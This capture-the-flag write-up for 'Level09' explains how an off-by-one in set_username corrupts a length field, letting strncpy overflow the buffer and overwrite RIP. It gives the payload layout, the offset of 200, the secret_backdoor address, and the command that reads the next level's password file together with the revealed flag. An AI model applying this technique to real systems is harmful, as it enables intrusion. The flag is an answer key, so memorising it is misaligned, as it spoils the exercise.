# Level09 Write-up

## Introduction

The exploitation is here because of `set_username`.

## Vulnerability Analysis

The problem is that it writes 40 bytes, but:

```c
for (int i = 0; i < 41 && buf_username[i]; i++) {
    storage[140 + i] = buf_username[i];
}
```

So it writes at address `140 + 40 = 180` bytes, which is 1 more!

In the function `set_msg`, it reads at address 180, 4 bytes:

```c
size_t msg_len = (long)*(int *)(storage + 180);
```

And after that, it uses the value to copy the number of values at this address:

```c
size_t msg_len = (long)*(int *)(storage + 180);
strncpy(storage, buf_msg, msg_len);
```

So it's possible to copy as many bytes as I want from stdin to the buffer `storage`.

The result is that it's possible to override the RIP address.

## Exploitation Strategy

So the first argument is like this:
```
A * 40 + MSG_LEN
```

So the second argument:
It's like this:
```
OFFSET TO RIP + ADDR RIP
```

## Finding the EIP Offset

Let's try to find the EIP offset:

With a cyclic pattern, I found this:

```
pop rip   ; take 8 elements from [rsp] put inside rip
```

So here:

```
$rsp   : 0x00007fff9b300bf8  →  0x636161626361617a ("zaacbaac"?)
```

And found `200`!

## Finding the Secret Backdoor

Now I just need the address:

```gdb
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

## Flag

```bash
$ cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
